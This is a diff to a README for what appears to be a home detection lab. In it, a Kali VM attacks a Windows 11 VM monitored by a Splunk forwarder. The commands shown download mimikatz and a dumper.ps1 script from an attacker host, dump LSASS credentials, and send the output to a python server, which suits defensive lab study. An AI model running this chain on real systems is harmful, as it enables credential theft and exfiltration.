@@ -14,7 +14,7 @@ Here, Virtual Windows 11 is the victim where universal forwarder is running,
 and Virtual Kali Linux is the attacker.
 - The Attack was simulated by Kali Linux on Windows as follows: 
 
-1) Attacker Login to Victim Machine via SSH and downloaded mimikatz along with a Powershell Script.  
+1) Attacker Login to Victim Machine via SSH and downloaded mimikatz along with a Powershell Scripts ![dumper.ps1](<scripts/dumper.ps1>).  
 ```
 ssh sshuser@192.168.0.103
 ```  
@@ -22,15 +22,16 @@ ssh sshuser@192.168.0.103
 curl http://192.168.0.106/mimikatz.exe -o mimikatz.exe
 ```
 ```
-curl http://192.168.0.106/dumper.ps1 -o ![dumper.ps1](<scripts/dumper.ps1>)
+curl http://192.168.0.106/dumper.ps1 -o dumper.ps1
 ```
+
 2) Then executed the following command to capture a lsass data which contain sensitive passwords.  
 ```
 powershell .\dumper.ps1
 ``` 
-3) Now Attacker has started a Manually created https server using python script and received the file which contain mimikatz output.  
+3) Now Attacker has started a Manually created https server using python script [server.py](<scripts/server.py>) and received the file which contain mimikatz output.  
 ```
-python3 [server.py](<scripts/server.py>)
+python3 server.py
 ```  
 ![recieved](logs/Screenshot_2025-06-06_23_48_41.png)
 
